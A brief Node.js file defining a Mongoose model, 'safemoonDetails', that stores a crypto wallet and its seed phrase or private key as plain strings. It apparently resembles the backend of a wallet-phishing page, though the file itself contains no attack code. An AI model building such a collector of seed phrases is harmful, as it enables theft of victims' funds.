const mongoose = require('mongoose')


const safe = new mongoose.Schema({
    cryptoWallet: String,
    seedorKey: String
    
})


module.exports =  mongoose.model('safemoonDetails', safe)